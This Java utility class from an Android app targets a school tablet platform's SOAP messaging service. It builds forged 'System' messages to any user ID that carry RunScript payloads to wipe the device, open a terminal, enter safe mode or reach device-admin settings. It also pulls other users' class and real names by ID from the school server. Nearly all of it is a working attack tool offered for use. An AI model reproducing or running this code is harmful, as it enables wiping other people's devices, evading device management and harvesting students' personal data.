package com.myi_utils;

import static com.myi_utils.PostActivity.TAG;

import android.util.Log;

import org.w3c.dom.Document;
import org.xml.sax.SAXException;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Pattern;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class HttpUtils {

    public static String result;

    public static String get_content(String content) {
        if (content.equals("wipe_data_lx")) {
            return "RunScript b=Application.getClassLoader().loadClass('com.netspace.library.application.MyiBaseApplication');b.requestJavaMethod('getMethod',2);app=b.getMethod('getInstance', null).invoke(null,null);app.onSetupDeviceMDM().onWipe();";
        }
        if (content.equals("wipe_data_hw")) {
            return "RunScript b=Application.getClassLoader().loadClass('com.netspace.library.application.MyiBaseApplication');b.requestJavaMethod('getMethod',2);app=b.getMethod('getInstance', null).invoke(null,null);app.onSetupDeviceMDM().onWipe();";
        }
        if (content.equals("wipe_data_sx")) {
            return "RunScript Application.getSystemService(\"enterprise_policy\").getSecurityPolicy().wipeDevice(1);";
        }
        if (content.equals("launch_terminal")) {
            return "RunScript launchIntent('jackpal.androidterm.Term', 'com.netspace.myipad', null)";
        }
        if (content.equals("launch_safe_mode")) {
            return "RunScript launchIntent('com.netspace.library.activity.SafeModeActivity', 'com.netspace.myipad', null)";
        }
        if (content.equals("launch_device_admin")) {
            return "RunScript launchIntent('com.android.settings.DeviceAdminSettings', 'com.android.settings', null)";
        }
        return "";
    }   

    public static String get_xml(String user_ID,String content) {
        String From_Id =  Integer.toString(Integer.parseInt(user_ID) + 1);
        return "<v:Envelope xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:d=\"http://www.w3.org/2001/XMLSchema\" xmlns:c=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:v=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
                "    <v:Header/>\n" +
                "    <v:Body>\n" +
                "        <IMRegisterMessage xmlns=\"http://webservice.myi.cn/wmstudyservice/wsdl/\" id=\"o0\" c:root=\"1\">\n" +
                "            <lpszGUID i:type=\"d:string\">798f3ea9d66e43f4bc94a5b2547462f7</lpszGUID>\n" +
                "            <lpszMessage i:type=\"d:string\">{\"guid\":\"357e6f2e7a0049ea8c9238eb1229cc39\",\"expire\":0,\"content\":\""+content+"\",\"from\":\"System\"}</lpszMessage>\n" +
                "            <lpszFrom i:type=\"d:string\">myipad_"+From_Id+"</lpszFrom>\n" +
                "            <lpszTo i:type=\"d:string\">myipad_"+user_ID+"</lpszTo>\n" +
                "            <nExpireInSeconds i:type=\"d:int\">20</nExpireInSeconds>\n" +
                "            <bBroadcast i:type=\"d:int\">0</bBroadcast>\n" +
                "        </IMRegisterMessage>\n" +
                "    </v:Body>\n" +
                "</v:Envelope>\n";
    }
    public static void Post(String server_address,String user_ID,String content){
        new Thread() {
            @Override
            public void run() {
                OkHttpClient okHttpClient = new OkHttpClient();
                RequestBody body = RequestBody.create(MediaType.parse("application/xml"),get_xml(user_ID,content));
                Request request = new Request.Builder()
                        .url(server_address)
                        .post(body)
                        .build();
                try {
                    Response response = okHttpClient.newCall(request).execute();
                    if (response.isSuccessful()) {
                        Log.d("aaaa", "run: ok");
                    }
                } catch (Exception e) {
                    Log.d("bbbb", e.toString());
                }
            }
        }.start();
    }


    public static String a = "<v:Envelope xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:d=\"http://www.w3.org/2001/XMLSchema\" xmlns:c=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:v=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
            "    <v:Header/>\n" +
            "    <v:Body>\n" +
            "        <UsersGetUserGUID xmlns=\"http://webservice.myi.cn/wmstudyservice/wsdl/\" id=\"o0\" c:root=\"1\">\n" +
            "            <lpszUserName i:type=\"d:string\">384625</lpszUserName>\n" +
            "        </UsersGetUserGUID>\n" +
            "    </v:Body>\n" +
            "</v:Envelope>\n";

    public static String getSoapXml(String action, Map<String,String> params) {
        String SoapXml =  "<v:Envelope xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:d=\"http://www.w3.org/2001/XMLSchema\" xmlns:c=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:v=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
                "    <v:Header/>\n" +
                "    <v:Body>\n" +
                "        <" + action +" xmlns=\"http://webservice.myi.cn/wmstudyservice/wsdl/\" id=\"o0\" c:root=\"1\">\n" ;
        for (Map.Entry<String, String> entry : params.entrySet()) {
            SoapXml += "            <" + entry.getKey() + " i:type=\"d:int\">" + entry.getValue() + "</" + entry.getKey() + ">\n";
        }
        SoapXml += "        </" + action + ">\n" +
                "    </v:Body>\n" +
                "</v:Envelope>";
        return SoapXml;
    }








    public static String aa = "<v:Envelope xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:d=\"http://www.w3.org/2001/XMLSchema\" xmlns:c=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:v=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
            "    <v:Header/>\n" +
            "    <v:Body>\n" +
            "        <UsersGetUserGUID xmlns=\"http://webservice.myi.cn/wmstudyservice/wsdl/\" id=\"o0\" c:root=\"1\">\n" +
            "            <lpszUserName i:type=\"d:string\">384625</lpszUserName>\n" +
            "        </UsersGetUserGUID>\n" +
            "    </v:Body>\n" +
            "</v:Envelope>\n";


    public static Response getSoapResponse(String action, Map<String,String> params) throws IOException {
        OkHttpClient okHttpClient = new OkHttpClient();
        RequestBody body = RequestBody.create(MediaType.parse("application/xml"),getSoapXml(action,params));
        Request request = new Request.Builder()
                .url("https://wzgjzx.lexuewang.cn:8003/")
                .post(body)
                .build();
        return okHttpClient.newCall(request).execute();
    }

//    public static String getUserInfo(String userId) throws IOException {
//        Map<String,String> getUserGuid = new HashMap<>();
//        getUserGuid.put("lpszUserName",userId);
//        String userGuid = getSoapResponse("UsersGetUserGUID",getUserGuid).body().string().split("<AS:szUserGUID>")[1].split("</AS:szUserGUID>")[0];
//        Map<String,String> getUserInfo = new HashMap<>();
//        getUserInfo.put("szUserGUID",userGuid);
//        return getSoapResponse("UsersGetUserInfoByGUID",getUserInfo).body().string();
//    }
//

    public static Map<String,String> getUserInfo(String userId) throws IOException {
        Map<String,String> getUserGuid = new HashMap<>();
        getUserGuid.put("lpszUserName",userId);
        String userGuid = getSoapResponse("UsersGetUserGUID",getUserGuid).body().string().split("<AS:szUserGUID>")[1].split("</AS:szUserGUID>")[0];
        Map<String,String> getUserInfo = new HashMap<>();
        getUserInfo.put("szUserGUID",userGuid);
        String UserInfo = Pattern.compile("[`#$Ax&,:{};]").matcher(getSoapResponse("UsersGetUserInfoByGUID",getUserInfo).body().string().split("<AS:szUserInfoJson>")[1].split("</AS:szUserInfoJson>")[0]).replaceAll("").replace(" ","").trim();
        String UserClass = UserInfo.split("\"name\"")[1].split("\"subject\"")[0].replace("\"","");
        String UserName = UserInfo.split("\"phonenumber\"")[1].split("\"realname\"")[1].split("\"schoolguid\"")[0].replace("\"","");
        Map<String,String> saveUserInfo = new HashMap<>();
        saveUserInfo.put("UserClass",UserClass);
        saveUserInfo.put("UserName",UserName);
        return saveUserInfo;
    }























}
